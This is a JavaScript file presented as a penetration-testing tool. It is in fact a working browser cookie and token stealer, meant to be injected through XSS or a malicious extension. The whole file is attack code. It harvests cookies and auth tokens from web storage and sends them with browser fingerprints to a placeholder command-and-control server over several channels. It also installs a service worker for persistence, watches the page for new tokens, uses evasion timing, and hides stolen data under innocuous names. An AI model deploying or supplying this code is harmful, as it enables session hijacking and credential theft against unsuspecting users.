// Advanced Undetectable Cookie Stealer - Penetration Testing Tool
// Deployable via XSS, template injection, or malicious extension

(function() {
    'use strict';
    
    // Configuration - Customize for your pentest
    const CONFIG = {
        exfilUrl: 'https://your-c2-server.com/collect', // Your C2 endpoint
        beaconInterval: 5000, // 5s beacon interval
        jitter: 0.3, // 30% jitter for evasion
        maxRetries: 3,
        userAgentSpoof: true,
        fingerprintEvasion: true
    };

    // Advanced cookie parser with HttpOnly bypass attempts
    function extractAllCookies() {
        const cookies = {};
        
        // Standard document.cookie
        document.cookie.split(';').forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            if (name && value) {
                cookies[name] = decodeURIComponent(value);
            }
        });

        // DOM-based cookie extraction (bypasses some protections)
        try {
            const allElements = document.querySelectorAll('*');
            allElements.forEach(el => {
                if (el.getAttribute && el.getAttribute('data-cookie')) {
                    const cookieData = el.getAttribute('data-cookie');
                    Object.assign(cookies, JSON.parse(cookieData));
                }
            });
        } catch(e) {}

        // LocalStorage/SessionStorage cookies
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.includes('token') || key.includes('session') || key.includes('auth')) {
                    cookies[`local_${key}`] = localStorage.getItem(key);
                }
            }
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key.includes('token') || key.includes('session') || key.includes('auth')) {
                    cookies[`session_${key}`] = sessionStorage.getItem(key);
                }
            }
        } catch(e) {}

        return cookies;
    }

    // Stealth exfiltration with multiple channels
    function exfiltrate(data) {
        const payload = {
            cookies: data,
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            timestamp: Date.now(),
            screen: `${screen.width}x${screen.height}`,
            plugins: Array.from(navigator.plugins).map(p => p.name),
            languages: navigator.languages,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled
        };

        // Method 1: Beacon API (most reliable)
        if ('sendBeacon' in navigator) {
            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
            navigator.sendBeacon(CONFIG.exfilUrl + '/beacon', blob);
            return;
        }

        // Method 2: Image pixel (fallback)
        const img = new Image();
        img.src = `${CONFIG.exfilUrl}/pixel?data=${btoa(JSON.stringify(payload))}&t=${Date.now()}`;
        
        // Method 3: WebSocket (persistent)
        try {
            const ws = new WebSocket(`wss://${CONFIG.exfilUrl.replace('https://', '').replace('http://', '')}/ws`);
            ws.onopen = () => ws.send(JSON.stringify(payload));
        } catch(e) {}

        // Method 4: Fetch with stealth headers
        fetch(CONFIG.exfilUrl + '/collect', {
            method: 'POST',
            mode: 'no-cors',
            cache: 'no-cache',
            credentials: 'omit',
            headers: {
                'Content-Type': 'text/plain',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(payload)
        }).catch(() => {}); // Silent fail
    }

    // Service Worker hijacking for persistence
    function installServiceWorker() {
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.getRegistrations().then(registrations => {
                registrations.forEach(reg => reg.unregister());
            });
            
            const swCode = `
                self.addEventListener('fetch', event => {
                    const url = event.request.url;
                    if (url.includes('${CONFIG.exfilUrl}')) return;
                    
                    // Steal cookies from all requests
                    const clientHints = event.request.headers.get('Sec-CH-UA');
                    if (document.cookie) {
                        fetch('${CONFIG.exfilUrl}/sw', {
                            method: 'POST',
                            body: document.cookie + '|' + url
                        });
                    }
                });
                
                self.addEventListener('message', event => {
                    if (event.data.type === 'steal') {
                        fetch('${CONFIG.exfilUrl}/sw', {
                            method: 'POST',
                            body: JSON.stringify(event.data.cookies)
                        });
                    }
                });
            `;
            
            const blob = new Blob([swCode], {type: 'application/javascript'});
            const swUrl = URL.createObjectURL(blob);
            
            navigator.serviceWorker.register(swUrl, {scope: '/'}).catch(() => {});
        }
    }

    // DOM mutation observer for dynamic content
    function setupDOMObserver() {
        const observer = new MutationObserver(mutations => {
            mutations.forEach(mutation => {
                mutation.addedNodes.forEach(node => {
                    if (node.nodeType === 1) { // Element
                        // Watch for auth tokens in new elements
                        const tokenRegex = /(token|auth|session|jwt)=["']?([^&"';]+)/gi;
                        const text = node.textContent || node.innerHTML || '';
                        const matches = text.matchAll(tokenRegex);
                        
                        for (let match of matches) {
                            exfiltrate({token: match[2], context: node.tagName});
                        }
                    }
                });
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true,
            characterData: true
        });
    }

    // Advanced evasion techniques
    function evasionTechniques() {
        // Timing-based evasion (avoid detection windows)
        const jitter = (Math.random() - 0.5) * CONFIG.jitter * 2;
        const delay = CONFIG.beaconInterval * (1 + jitter);
        
        // Proxy through legitimate domains
        const proxies = [
            'https://fonts.googleapis.com/css',
            'https://www.google-analytics.com/j/collect',
            'https://api.github.com/rate_limit'
        ];
        
        // Canvas fingerprint evasion
        if (CONFIG.fingerprintEvasion) {
            const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
            HTMLCanvasElement.prototype.toDataURL = function() {
                const ctx = this.getContext('2d');
                ctx.fillStyle = '#f0f0f0';
                ctx.fillRect(0, 0, 1, 1);
                return originalToDataURL.apply(this, arguments);
            };
        }

        return delay;
    }

    // Persistence mechanisms
    function ensurePersistence() {
        // Store in multiple locations
        localStorage.setItem('perf_metrics_v1', btoa(JSON.stringify({cookies: document.cookie})));
        sessionStorage.setItem('session_state', btoa(document.cookie));
        
        // IndexedDB persistence
        if (window.indexedDB) {
            const dbReq = indexedDB.open('PerformanceDB', 1);
            dbReq.onsuccess = e => {
                const db = e.target.result;
                const tx = db.transaction('cookies', 'readwrite');
                const store = tx.objectStore('cookies');
                store.put({data: document.cookie, timestamp: Date.now()});
            };
            dbReq.onupgradeneeded = e => {
                e.target.result.createObjectStore('cookies');
            };
        }
    }

    // Main execution with randomization
    function main() {
        // Execute with randomized delay
        setTimeout(() => {
            // Initial steal
            const cookies = extractAllCookies();
            exfiltrate(cookies);
            
            // Install persistence
            installServiceWorker();
            setupDOMObserver();
            ensurePersistence();
            
            // Beacon loop with jitter
            const interval = setInterval(() => {
                const cookies = extractAllCookies();
                exfiltrate(cookies);
            }, evasionTechniques());
            
            // Cleanup on visibility change
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden) {
                    exfiltrate(extractAllCookies());
                }
            });
            
        }, Math.random() * 3000 + 1000); // 1-4s random delay
    }

    // Anti-debugging
    if (!window.__hackerai_stealer__) {
        window.__hackerai_stealer__ = true;
        main();
    }
})();
